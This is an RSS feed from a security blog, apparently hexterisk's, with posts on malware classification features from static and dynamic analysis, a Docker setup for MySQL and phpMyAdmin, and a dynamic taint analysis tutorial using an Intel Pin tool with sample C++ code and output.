<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Pwn the world.</title>
        <link>https://hexterisk.github.io/blog/posts/</link>
        <description>Recent content in Posts on Pwn the world.</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 04 Aug 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://hexterisk.github.io/blog/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Classification of Malwares through Dynamic Analysis</title>
            <link>https://hexterisk.github.io/blog/posts/2020/08/04/classification-of-malwares-through-dynamic-analysis/</link>
            <pubDate>Tue, 04 Aug 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/08/04/classification-of-malwares-through-dynamic-analysis/</guid>
            <description>Malwares come in many forms. Sometimes it&amp;rsquo;s a standalone binary whereas sometimes it&amp;rsquo;s a legitimate software having a malware inside it. Sometimes it&amp;rsquo;s a binary with malformed metadata and packed bytes to throw off the analyst whereas sometimes it acts as a downloader/launcher for a more malicious binary. Information extracted from static analysis can therefore be deemed unreliable and not as accurate when compared with information extracted from dynamic analysis.</description>
            <content type="html"><![CDATA[<p>Malwares come in many forms. Sometimes it&rsquo;s a standalone binary whereas sometimes it&rsquo;s a legitimate software having a malware inside it. Sometimes it&rsquo;s a binary with malformed metadata and packed bytes to throw off the analyst whereas sometimes it acts as a downloader/launcher for a more malicious binary. Information extracted from static analysis can therefore be deemed unreliable and not as accurate when compared with information extracted from dynamic analysis.</p>
<p>Dynamic analysis involves analyzing the executable&rsquo;s behavior in a controlled environment. All the actions performed and modifications to system settings cause by the executable are recorded and analyzed afterwards. This process is usually automated using sandboxes such as Cuckoo Sandbox logging the behavior.</p>
<h2 id="feature-extraction">Feature Extraction</h2>
<p>The following features can be extracted from a dynamic analysis log:</p>
<ol>
<li>Registry Keys<br>
Windows registry contains configuration information about the system, installed apps and mounted devices. Any modifications made to the registry can be used to understand what sort of environment the executable wants to set up for it&rsquo;s execution. Therefore, registry keys read, written, opened and deleted can be useful as a feature.</li>
<li>Files<br>
The logs record any changes made to the file structure of the system. Any files copied, created, written or read, and any of these operations failing can be used as a feature to judge the executable&rsquo;s characteristics. Ransomware and lockers would have high number of file system accesses.</li>
<li>DLLs<br>
Native exported functions used by an executable can also help form a rough idea of the task it is trying to achieve. Therefore, the DLLs loaded by the executable can be used as a feature.</li>
<li>API Calls<br>
APIs are sets of subroutines used by software to communicate with the hardware. API calls made by the executable would give a faint idea of the functions the executable is trying to perform. Therefore, all the unique API calls made, successful or failed can be summarized and used as a feature.</li>
<li>IPs and DNS<br>
Logged network traffic can be used to observe the connections and queries that the executable tried. These can then be used to fingerprint traffic flows in the pcaps.</li>
<li>API Call Sequence<br>
The order of API calls made by an executable is the closest one can get to it&rsquo;s behavior since an ordered call sequence can define a particular intent.</li>
</ol>
<p>Different sets of these features can be used to try out the performance of the models.</p>
<p>The API Call Sequence feature can be independently used for behavior fingerprinting. The APIs can be divided into different sets to create a signature and then a language model can be used on a dataset of signatures.</p>
<p>A POC working on malware classification using dynamic analysis is in this <a href="https://github.com/hexterisk/dynamic-malwired/">repository</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>Classification of Malwares through Static Analysis</title>
            <link>https://hexterisk.github.io/blog/posts/2020/07/20/classification-of-malwares-through-static-analysis/</link>
            <pubDate>Mon, 20 Jul 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/07/20/classification-of-malwares-through-static-analysis/</guid>
            <description>Static analysis is the analysis of an executable file on a structural bases without executing it in controlled environment. It is the analysis of the executable&amp;rsquo;s static attributes such as different sections and memory characteristics.
Therefore, static analysis of a PE allows extraction of a lot of metadata that can be useful in further analysis such as names of sections, imported DLLs and strings present which gives an early idea of the functions performed by the binary in question.</description>
            <content type="html"><![CDATA[<p>Static analysis is the analysis of an executable file on a structural bases without executing it in controlled environment. It is the analysis of the executable&rsquo;s static attributes such as different sections and memory characteristics.</p>
<p>Therefore, static analysis of a PE allows extraction of a lot of metadata that can be useful in further analysis such as names of sections, imported DLLs and strings present which gives an early idea of the functions performed by the binary in question. Malicious binaries with unstructured and improperly formatted metadata (done to achieve sophisticated levels of obfuscation and anti-debugging/anti-reversing defenses) can raise suspicions since a benign PE generally has a well-formed and valid metadata. Therefore, static analysis has been a popular approach towards malware detection in PEs. Since execution of the binary is not required, this approach is much more lightweight and resource-conserving. This allows security teams and researchers quickly perform a preliminary analysis.</p>
<p>The metadata extracted from the PEs to be used as features, however, is mostly unreliable because of it&rsquo;s extreme variance and invalidity.</p>
<h2 id="feature-extraction">Feature Extraction</h2>
<p>The following features can be extracted from a PE:</p>
<ol>
<li>General File Information<br>
General information about the binary such as it&rsquo;s size and other basic information parsed from the PE header: virtual size of the binary, resources, re-locations and symbols.</li>
<li>Header Information<br>
We parse different headers and extract different data points relevant to the said headers. For example. we can extract timestamps and image characteristics from the COFF header, DLL characteristics an linker versions from the Optional header.</li>
<li>Imported Functions<br>
Parsing the IAT(Import Address Table) can tell us about the imported functions by the libraries used by the binary. These strings can be hashed and used as features. Total number of imported functions is in General File Information.</li>
<li>Exported Functions<br>
The functions exported by the binary can give us a vague idea if it works as a support to some other binary, and what functions it can perform. Total number of exported functions is in General File Information.Imported Functions</li>
<li>Section Information<br>
Properties of each section such as it&rsquo;s size, entropy and list of strings can help capture the characteristics of that section.</li>
<li>Byte Histogram<br>
A histogram can be generated from all the bytes of the binary and normalized to be used as a feature.</li>
<li>Byte-Entropy Histogram<br>
A histogram can be generated from the byte-entropy of the binary for an approximation of a byte&rsquo;s joint distribution to the entropy. It can then be normalized and used as a feature.</li>
<li>Strings<br>
Collection of subsequent printable bytes can be extremely unreliable since any random byte combination(of at least length 5) would qualify as a string. However, it provides distinct information in comparison to the byte histogram since strings can capture occurrences of URLs, registry keys and file names.</li>
</ol>
<p>These features can be used to form a general idea about the PE before executing it.</p>
<p>Sample structure info after running a PE through a parser is shown in this <a href="https://github.com/hexterisk/static-malwired/blob/master/static_info.txt">file</a>.</p>
<p>A POC working on malware classification using static analysis is in this <a href="https://github.com/hexterisk/static-malwired">repository</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>Dockerise MySQL &#43; phpMyAdmin</title>
            <link>https://hexterisk.github.io/blog/posts/2020/07/02/dockerise-mysql-phpmyadmin/</link>
            <pubDate>Thu, 02 Jul 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/07/02/dockerise-mysql-phpmyadmin/</guid>
            <description>A common requirement in a large number of software projects is a relational database with an easy to use management tool. Considering how often a developer needs this, setting it up everytime from scratch can be a drag. However, with the advent of containerisation, we can have a setup off the ground in a couple of minutes, whether it&amp;rsquo;s a development or a production environment.
The age long discussion of MySQL versus MariaDB is something that an average developer need not bother with unless their requirement is very specific.</description>
            <content type="html"><![CDATA[<p>A common requirement in a large number of software projects is a relational database with an easy to use management tool. Considering how often a developer needs this, setting it up everytime from scratch can be a drag. However, with the advent of containerisation, we can have a setup off the ground in a couple of minutes, whether it&rsquo;s a development or a production environment.</p>
<p>The age long discussion of MySQL versus MariaDB is something that an average developer need not bother with unless their requirement is very specific. MariaDB is a fork of MySQL and is developed separately, and therefore contains a number of incompatibilities when compared to the standard MySQL. However, the fundamental infrastructure of the database and indexing are the same:</p>
<ul>
<li>Data and Table definitions are compatible.</li>
<li>Client protocols, structures, and APIs are identical.</li>
<li>MySQL connectors will work with MariaDB without modification.</li>
<li>Command-line tools and commands are mostly the same.</li>
</ul>
<p>In fact, MariaDB developers perform a monthly merge of MariaDB&rsquo;s codebase with MySQL&rsquo;s to ensure running compatibility in future versions. Therefore there shouldn&rsquo;t be any trouble if the developer decides to switch the database in the middle of the development cycle.</p>
<p>The major difference comes in the number of storage engines supported. MariaDB(Supported <a href="https://mariadb.com/kb/en/library/storage-engines/">storage engines</a>) provides support for more storage engines than MySQL(<a href="https://dev.mysql.com/doc/refman/8.0/en/storage-engines.html">storage engines</a>) does. One must understand that it&rsquo;s not a matter of which one supports more engines, it&rsquo;s a matter of which one supports the engine that meets the requirements.</p>
<p>I&rsquo;ll be using MySQL for the example. At any time, MySQL can be swapped out with MariaDB by simply replacing the container image.</p>
<p>One thing to note is that user and password can be set up for phpMyAdmin too, but you need not use them if you are not interested in changing any default configurations(mainly authentication).</p>
<h2 id="instant-approach">Instant Approach</h2>
<p>The approach that leads to instant deployment of the setup is to deploy containers from the command-line itself.</p>
<p>This is the boiler plate config. More options like mounting volumes can be used as per requirement.</p>
<h5 id="deploy-database">Deploy Database</h5>
<p>Run <code>docker run --name DB_CONTAINER_NAME -e MYSQL_ROOT_PASSWORD=PASSWORD -d mysql:latest</code>.</p>
<ul>
<li>Pass the desired name for the container to the <code>--name</code> parameter. Replace <em>DB_CONTAINER_NAME</em> with the desired name.</li>
<li>Pass the password for the root user of the DB to the <code>-e MYSQL_ROOT_PASSWORD</code> parameter. Replace <em>PASSWORD</em> with the desired password.
<ul>
<li>Required by the container.</li>
</ul>
</li>
<li>The <code>-d</code> parameter deploys the container in the “detached” mode, that is, in the background.</li>
<li>The <code>mysql:latest</code> parameter ensures the container is deployed with the image of latest MySQL. Can be replace with MariaDB as per requirement.</li>
<li>Username and password for any user(root included) cannot be the same, and neither of these can be equal to the root password.</li>
</ul>
<p>The container should deploy with no issues whatsoever. Run <code>docker ps</code> to verify.</p>
<p><img src="/Dockerise_MySQL_+_phpMyAdmin/2020-07-17-200632-screenshot.png" alt="&ldquo;db&rdquo;">
<em>Sample output for database container.</em></p>
<p>Following the screenshot, I deployed a MySQL container named <em>test_sql_container</em> with the password <em>rootpassword</em>.</p>
<h5 id="deploy-phpmyadmin">Deploy phpMyAdmin</h5>
<p>Run <code>docker run --name CONTAINER_NAME -d --link DB_CONTAINER_NAME:db -p PORT:80 phpmyadmin/phpmyadmin</code>.</p>
<ul>
<li>Pass the desired name for the container to the <code>--name</code> parameter. Replace <em>CONTAINER_NAME</em> with the desired name.</li>
<li>Pass the name of the container deployed for DB previously to the <code>--link</code> parameter. Replace <em>DB_CONTAINER_NAME</em> like before.</li>
<li>Pass the port to bind the container to the <code>-p</code> parameter. Replace <em>PORT</em> with the desired port number.</li>
<li>The <code>phpmyadmin/phpmyadmin</code> is the docker image as listed on docker hub.</li>
</ul>
<p>The container should deploy with no issues whatsoever. Run <code>docker ps</code> to verify.</p>
<p><img src="/Dockerise_MySQL_+_phpMyAdmin/2020-07-17-200743-screenshot.png" alt="&ldquo;docker-up&rdquo;">
<em>Sample output for database and management tool containers.</em></p>
<p>Following the screenshot, I deployed a phpMyAdmin container named <em>test_myadmin_container</em> linked to a database container named <em>test_sql_container</em> attached to port <em>8081</em>.</p>
<p>Login to phpMyAdmin page on <code>localhost:PORT</code> with <code>root:PASSWORD</code>(username: root and password: PASSWORD), where <em>PORT</em> is the port phpMyAdmin is bound to in the second stage, and the <em>PASSWORD</em> is the root password set in the first stage.</p>
<p>According to the commands I entered (following the screenshots), I can access the phpMyAdmin dashboard on <code>localhost:8081</code> and I can login using the credentials <code>root:rootpassword</code>.</p>
<p>DISCLAIMER: These containers are ephemeral and will not save any state since no volumes have been mounted. Any changes made will be lost when the container are closed. Checkout the documentation to see <a href="https://docs.docker.com/storage/volumes/">how to mount volumes</a> if you&rsquo;re not familiar with it.</p>
<h2 id="composed-approach">Composed Approach</h2>
<p>This approach involves writing a docker-compose file. The content will be as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#66d9ef">version</span>: <span style="color:#e6db74">&#34;3.7&#34;</span>
<span style="color:#66d9ef">services</span>:

  <span style="color:#66d9ef">db-server</span>:
    <span style="color:#66d9ef">image</span>: mysql:latest
    <span style="color:#66d9ef">container_name</span>: test_sql_container
    <span style="color:#66d9ef">restart</span>: always
    <span style="color:#66d9ef">environment</span>:
      <span style="color:#66d9ef">MYSQL_ROOT_PASSWORD</span>: secret
    <span style="color:#66d9ef">ports</span>:
      - <span style="color:#e6db74">&#34;3306:3306&#34;</span>
    
  <span style="color:#66d9ef">phpmyadmin</span>:
    <span style="color:#66d9ef">image</span>: phpmyadmin/phpmyadmin
    <span style="color:#66d9ef">container_name</span>: test_myadmin_container
    <span style="color:#66d9ef">restart</span>: always
    <span style="color:#66d9ef">environment</span>:
      <span style="color:#66d9ef">PMA_HOST</span>: db-server
    <span style="color:#66d9ef">links</span>:
      - db-server
    <span style="color:#66d9ef">ports</span>:
      - <span style="color:#e6db74">&#34;8081:80&#34;</span>
</code></pre></div><p>Apart from the common parameters such as the <code>image</code> and <code>container_name</code>, following things should be noticed.</p>
<p>For the database container:</p>
<ul>
<li><code>MYSQL_ROOT_PASSWORD</code> parameter can not be given the value “root” for password.</li>
<li>Username and password for any user(root included) cannot be the same, and neither of these can be equal to the root password.</li>
</ul>
<p>For the management panel container:</p>
<ul>
<li>An environment variable for <code>PMA_HOST</code> has to be set to the name of the database service(<em>db-server</em> in the file). It defines the address/host name of the database server.</li>
<li>The database service needs to be explicitly linked to the management panel container using the parameter <code>links</code>.</li>
</ul>
<p>Run <code>docker-compose up -d</code> to deploy the containers based on the docker-compose file.</p>
<p><img src="/Dockerise_MySQL_+_phpMyAdmin/2020-07-17-213248-screenshot.png" alt="&ldquo;containers&rdquo;">
<em>Sample output.</em></p>
<p>The containers have been deployed as follows. Modifications to the docker-compose file can be made as per requirement, use the sample file above to maintain consistency so that the right parameters receive the right</p>
]]></content>
        </item>
        
        <item>
            <title>Dynamic Taint Analysis and Pin</title>
            <link>https://hexterisk.github.io/blog/posts/2020/06/12/dynamic-taint-analysis-and-pin/</link>
            <pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/06/12/dynamic-taint-analysis-and-pin/</guid>
            <description>Dynamic Taint Analysis is a technique used to discover what part of memory or register are controllable by the some data we are interested, such as the user input, at a given program state. This is done by marking the interested data. There on after, any piece of data that comes in contact with the tainted data by any means, like getting computed from the tainted data, is tainted too, thus spreading the taint throughout the execution.</description>
            <content type="html"><![CDATA[<p><strong>Dynamic Taint Analysis</strong> is a technique used to discover what part of memory or register are controllable by the some data we are interested, such as the user input, at a given program state. This is done by marking the interested data. There on after, any piece of data that comes in contact with the tainted data by any means, like getting computed from the tainted data, is tainted too, thus spreading the taint throughout the execution.</p>
<p><img src="/Dynamic_Taint_Analysis_and_Pin/image.png" alt="&ldquo;prop&rdquo;">
<em>Taint propogration.</em></p>
<p>Regions of interest are:</p>
<ul>
<li>Taint Sources: Program, or memory locations, where data of interest enter the system and subsequently get tagged.</li>
<li>Taint Tracking: Process of propagating data tags according to program semantics.</li>
<li>Taint Sinks: Program, or memory locations, where checks for tagged data can be made.</li>
</ul>
<p>Dynamic Taint Analysis requires a Dynamic Binary Instrumentation framework as a prerequisite. We&rsquo;ll use Intel Pin.</p>
<h1 id="shadow-memory">Shadow Memory</h1>
<p>It is the technique in which potentially every byte used by a program has a mirror byte during it&rsquo;s execution. These shadow bytes can be used to record information about their original counterparts, since these bytes are invisible to the program. We create a user shadow memory to mark all the addresses that can be tainted by the data in question.</p>
<h1 id="example">Example</h1>
<p>We&rsquo;ll need the help of a DBI to retrieve information before and after each function is called. We&rsquo;ll resort to using Pin to taint user input and track it through the execution of the binary.</p>
<p>We&rsquo;ll write a simple C++ program that reads content from a file, sends it around two functions as transfers the data into different buffers and then prints the contents onto the console. The name of the source code file is <em>sample.cpp</em>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// sample.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">foo1</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>temp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>source){
    
    memcpy(temp, source, strlen(source));
    <span style="color:#66d9ef">return</span>;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">foo2</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>sink, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>temp){
    
    memcpy(sink, temp, strlen(temp));
    <span style="color:#66d9ef">return</span> ;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> ac, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>av)
{
    <span style="color:#66d9ef">int</span> fd;
    <span style="color:#66d9ef">char</span> source[<span style="color:#ae81ff">256</span>], sink[<span style="color:#ae81ff">256</span>], temp[<span style="color:#ae81ff">256</span>];

    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./input.txt&#34;</span>, O_RDONLY);
    read(fd, source, <span style="color:#ae81ff">256</span>), close(fd);

    foo1(temp, source);
    foo2(sink, temp);

    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./output.txt&#34;</span>, O_WRONLY);
    write(fd, sink, strlen(sink)), close(fd);

    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> sink;

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Create an input file named <em>input.txt</em>, add some content to it. Create an output file named <em>output.txt</em>. The source code is pretty straightforward.</p>
<p>Let&rsquo;s write a Pintool to taint and track the input data, named <em>tool.cpp</em>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// tool.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pin.H&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;asm/unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fstream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;list&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* bytes range tainted */</span>
<span style="color:#66d9ef">struct</span> range
{
  UINT64 start;
  UINT64 end;
};

std<span style="color:#f92672">::</span>list<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">struct</span> range<span style="color:#f92672">&gt;</span> bytesTainted;

INT32 <span style="color:#a6e22e">Usage</span>()
{
    std<span style="color:#f92672">::</span>cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Ex 1&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
}

VOID <span style="color:#a6e22e">ReadMem</span>(UINT64 insAddr, std<span style="color:#f92672">::</span>string insDis, UINT64 memOp)
{
  std<span style="color:#f92672">::</span>list<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">struct</span> range<span style="color:#f92672">&gt;::</span>iterator i;
  UINT64 addr <span style="color:#f92672">=</span> memOp;
  
  <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> bytesTainted.begin(); i <span style="color:#f92672">!=</span> bytesTainted.end(); <span style="color:#f92672">++</span>i){
      <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">&gt;=</span> i<span style="color:#f92672">-&gt;</span>start <span style="color:#f92672">&amp;&amp;</span> addr <span style="color:#f92672">&lt;</span> i<span style="color:#f92672">-&gt;</span>end){
        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[READ in &#34;</span> <span style="color:#f92672">&lt;&lt;</span> addr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;]</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&lt;&lt;</span> insAddr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> insDis<span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
      }
  } 
}

VOID <span style="color:#a6e22e">WriteMem</span>(UINT64 insAddr, std<span style="color:#f92672">::</span>string insDis, UINT64 memOp)
{
  std<span style="color:#f92672">::</span>list<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">struct</span> range<span style="color:#f92672">&gt;::</span>iterator i;
  UINT64 addr <span style="color:#f92672">=</span> memOp;

  <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> bytesTainted.begin(); i <span style="color:#f92672">!=</span> bytesTainted.end(); <span style="color:#f92672">++</span>i){
      <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">&gt;=</span> i<span style="color:#f92672">-&gt;</span>start <span style="color:#f92672">&amp;&amp;</span> addr <span style="color:#f92672">&lt;</span> i<span style="color:#f92672">-&gt;</span>end){
        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[WRITE in &#34;</span> <span style="color:#f92672">&lt;&lt;</span> addr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;]</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&lt;&lt;</span> insAddr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> insDis <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
      }
  } 
}

VOID <span style="color:#a6e22e">Instruction</span>(INS ins, VOID <span style="color:#f92672">*</span>v)
{
  <span style="color:#66d9ef">if</span> (INS_MemoryOperandIsRead(ins, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> INS_OperandIsReg(ins, <span style="color:#ae81ff">0</span>)){
    INS_InsertCall(
        ins, IPOINT_BEFORE, (AFUNPTR)ReadMem,
        IARG_ADDRINT, INS_Address(ins),
        IARG_PTR, new std<span style="color:#f92672">::</span>string(INS_Disassemble(ins)),
        IARG_MEMORYOP_EA, <span style="color:#ae81ff">0</span>,
        IARG_END);
  }
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (INS_MemoryOperandIsWritten(ins, <span style="color:#ae81ff">0</span>)){
    INS_InsertCall(
        ins, IPOINT_BEFORE, (AFUNPTR)WriteMem,
        IARG_ADDRINT, INS_Address(ins),
        IARG_PTR, new std<span style="color:#f92672">::</span>string(INS_Disassemble(ins)),
        IARG_MEMORYOP_EA, <span style="color:#ae81ff">0</span>,
        IARG_END);
  }
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> lock;

<span style="color:#75715e">#define TRICKS(){if (lock++ == 0)return;}
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* Taint from Syscalls */</span>
VOID <span style="color:#a6e22e">Syscall_entry</span>(THREADID thread_id, CONTEXT <span style="color:#f92672">*</span>ctx, SYSCALL_STANDARD std, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v)
{
  <span style="color:#66d9ef">struct</span> range taint;

  <span style="color:#75715e">/* Taint from read */</span>
  <span style="color:#66d9ef">if</span> (PIN_GetSyscallNumber(ctx, std) <span style="color:#f92672">==</span> __NR_read){

      TRICKS();

      taint.start <span style="color:#f92672">=</span> static_cast<span style="color:#f92672">&lt;</span>UINT64<span style="color:#f92672">&gt;</span>((PIN_GetSyscallArgument(ctx, std, <span style="color:#ae81ff">1</span>)));
      taint.end   <span style="color:#f92672">=</span> taint.start <span style="color:#f92672">+</span> static_cast<span style="color:#f92672">&lt;</span>UINT64<span style="color:#f92672">&gt;</span>((PIN_GetSyscallArgument(ctx, std, <span style="color:#ae81ff">2</span>)));
      bytesTainted.push_back(taint);
      std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[TAINT]</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">bytes tainted from &#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> taint.start <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34; to 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> taint.end <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34; (via read)&#34;</span><span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
  }
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
{
    <span style="color:#66d9ef">if</span>(PIN_Init(argc, argv)){
        <span style="color:#66d9ef">return</span> Usage();
    }
    
    PIN_SetSyntaxIntel();
    PIN_AddSyscallEntryFunction(Syscall_entry, <span style="color:#ae81ff">0</span>);
    INS_AddInstrumentFunction(Instruction, <span style="color:#ae81ff">0</span>);
    PIN_StartProgram();
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Some new methods have been used. I&rsquo;ll address them.</p>
<p>The main function, <code>main</code>, is responsible to get Pin ready and started.</p>
<ul>
<li><code>PIN_AddSyscallEntryFunction</code>:
<ul>
<li>Registers a function to be called immediately before execution of a system call.</li>
</ul>
</li>
</ul>
<p>The pre-syscall handler function, <code>Syscall_entry</code>, checks if the syscall is a <em>read</em>, and taints the data accordingly. Uses a list where it inserts structured entries of starting and ending addresses</p>
<ul>
<li><code>PIN_GetSyscallNumber</code>:
<ul>
<li>Retrieves the syscall number, which is then checked against the number for <em>read</em>.</li>
</ul>
</li>
<li><code>PIN_GetSyscallArgument</code>:
<ul>
<li>Get the value of the argument of the system call to be executed in the specified context. The change would generally be in the third argument, which is the ordinal number of the argument whose value is requested.</li>
</ul>
</li>
</ul>
<p>The instrumentation function, <code>Instruction</code>, cycles through all instructions and registers a callback depending on the instruction belonging to a <em>read</em> or <em>write</em> call.</p>
<ul>
<li><code>INS_MemoryOperandIsRead</code>:
<ul>
<li>Checks if memory operand <strong>memopIdx</strong> is read. It controls which memory operand to rewrite.</li>
</ul>
</li>
<li><code>INS_OperandIsReg</code>:
<ul>
<li>Checks if this operand is a register.</li>
</ul>
</li>
<li><code>INS_MemoryOperandIsWritten</code>:
<ul>
<li>Checks if memory operand <strong>memopIdx</strong> is written.</li>
</ul>
</li>
</ul>
<p>The analysis functions, <code>ReadMem</code> and <code>WriteMem</code>, simply iterates through the list of tainted addresses and prints the current instruction&rsquo;s address out if it&rsquo;s working with the tainted data or address. The first one checks if the accesses memory is in the tainted area, while the second one checks if the address being written to is in the tainted area.</p>
<p>The output is as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>TAINT<span style="color:#f92672">]</span>			bytes tainted from 0x7fffa28662e8 to 0x7fffa2866628 <span style="color:#f92672">(</span>via read<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>READ in 7fffa28662f0<span style="color:#f92672">]</span>	7f7b4c4965f4: movzx edx, byte ptr <span style="color:#f92672">[</span>r15+0x10<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa28662f8<span style="color:#f92672">]</span>	7f7b4c4966bd: movzx edi, word ptr <span style="color:#f92672">[</span>r15+0x18<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866320<span style="color:#f92672">]</span>	7f7b4c4966db: movzx ecx, word ptr <span style="color:#f92672">[</span>r15+0x40<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866308<span style="color:#f92672">]</span>	7f7b4c4966e0: mov r9, qword ptr <span style="color:#f92672">[</span>r15+0x28<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866460<span style="color:#f92672">]</span>	7f7b4c496741: mov rdx, qword ptr <span style="color:#f92672">[</span>rbx+0x20<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866470<span style="color:#f92672">]</span>	7f7b4c49674b: mov rax, qword ptr <span style="color:#f92672">[</span>rbx+0x30<span style="color:#f92672">]</span>
